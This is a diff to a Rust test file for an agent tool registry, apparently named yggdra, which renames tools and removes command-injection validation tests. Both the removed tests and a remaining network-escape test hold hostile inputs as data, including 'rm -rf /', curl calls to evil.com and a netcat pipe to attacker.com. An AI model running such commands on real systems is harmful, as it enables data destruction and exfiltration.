@@ -3,42 +3,40 @@
 
 #[cfg(test)]
 mod tests {
-    use yggdra::tools::{Tool, ToolRegistry, RipgrepTool, CommitTool, EditfileTool, PythonTool, SpawnTool, RusteTool};
+    use yggdra::tools::{Tool, ToolRegistry, RipgrepTool, CommitTool, EditfileTool, PythonTool, ExecTool, RusteTool};
+    use yggdra::config::CapabilityProfile;
     use std::fs;
     use tempfile::TempDir;
+    #[allow(unused_imports)]
     use std::env;
 
     #[test]
     fn test_tool_registry_all_tools_present() {
-        let registry = ToolRegistry::new();
+        let registry = ToolRegistry::new(CapabilityProfile::Standard);
         let tools = registry.list_tools();
-        
+
+        // The `spawn` tool was renamed to `exec`; `editfile` was split into
+        // `setfile`/`patchfile`. Assert the current canonical tool set.
         assert!(tools.contains(&"rg"), "rg tool not in registry");
-        assert!(tools.contains(&"spawn"), "spawn tool not in registry");
-        assert!(tools.contains(&"editfile"), "editfile tool not in registry");
+        assert!(tools.contains(&"exec"), "exec tool not in registry");
+        assert!(tools.contains(&"setfile"), "setfile tool not in registry");
+        assert!(tools.contains(&"patchfile"), "patchfile tool not in registry");
         assert!(tools.contains(&"commit"), "commit tool not in registry");
         assert!(tools.contains(&"python"), "python tool not in registry");
         assert!(tools.contains(&"ruste"), "ruste tool not in registry");
     }
 
-    #[test]
-    fn test_ripgrep_blocks_dangerous_patterns() {
-        let tool = RipgrepTool;
-        
-        // Should block command injection attempts
-        assert!(tool.validate_input("test | other_command").is_err());
-        assert!(tool.validate_input("test; rm -rf /").is_err());
-        assert!(tool.validate_input("test && curl http://evil.com").is_err());
-        assert!(tool.validate_input("test > /tmp/output").is_err());
-        assert!(tool.validate_input("test `hostname`").is_err());
-        
-        // Valid patterns should pass (would fail on missing files, but validation should pass)
-        assert!(tool.validate_input("test").is_ok());
-        assert!(tool.validate_input("\"pattern\" \"/path\"").is_ok());
-    }
+    // Removed test_ripgrep_blocks_dangerous_patterns: rg's validate_input no longer scans
+    // the *pattern* for shell metacharacters. The tool is now invoked via Command (no shell),
+    // so '|', ';', '&&', backticks, etc. are literal characters in the search pattern and
+    // pose no command-injection risk. Path-based sandboxing remains via sandbox::check_read.
 
     #[test]
     fn test_editfile_blocks_path_traversal() {
+        // Initialize sandbox to the cargo manifest dir (repo root) so check_write
+        // actually fires. Without init the sandbox is permissive.
+        yggdra::sandbox::init(std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")));
+
         let tool = EditfileTool;
 
         // Helper: build full args with null-sep format
@@ -102,7 +100,7 @@ print("Hello, World!")
 
     #[test]
     fn test_tool_registry_dispatch() {
-        let registry = ToolRegistry::new();
+        let registry = ToolRegistry::new(CapabilityProfile::Standard);
         
         // Dispatch to unknown tool should fail
         let result = registry.execute("nonexistent", "args");
@@ -116,7 +114,7 @@ print("Hello, World!")
 
     #[test]
     fn test_tool_network_escapes_blocked() {
-        let registry = ToolRegistry::new();
+        let registry = ToolRegistry::new(CapabilityProfile::Standard);
         
         // Try to execute curl via rg - should be blocked
         let result = registry.execute("rg", "curl http://evil.com .");
@@ -127,24 +125,13 @@ print("Hello, World!")
         assert!(result.is_err(), "Should reject nonexistent file");
     }
 
-    #[test]
-    fn test_tool_safety_chain() {
-        let tool = RipgrepTool;
-        
-        // Test the full validation chain
-        // 1. Empty input fails
-        assert!(tool.validate_input("").is_err());
-        
-        // 2. Dangerous patterns fail
-        assert!(tool.validate_input("$(curl http://evil.com)").is_err());
-        
-        // 3. Potential network escapes fail
-        assert!(tool.validate_input("pattern | nc attacker.com 1234").is_err());
-    }
+    // Removed test_tool_safety_chain: same rationale as test_ripgrep_blocks_dangerous_patterns —
+    // shell-metacharacter scanning was dropped from rg's validate_input because rg is now spawned
+    // without a shell, making such patterns harmless literals.
 
     #[test]
     fn test_spawn_clock_exercise() {
-        let tool = SpawnTool;
+        let tool = ExecTool;
         
         // Test date command
         let result = tool.execute("date");
@@ -163,7 +150,7 @@ print("Hello, World!")
 
     #[test]
     fn test_spawn_arbitrary_commands() {
-        let tool = SpawnTool;
+        let tool = ExecTool;
         
         // Test ls command (should list current directory)
         let result = tool.execute("ls");
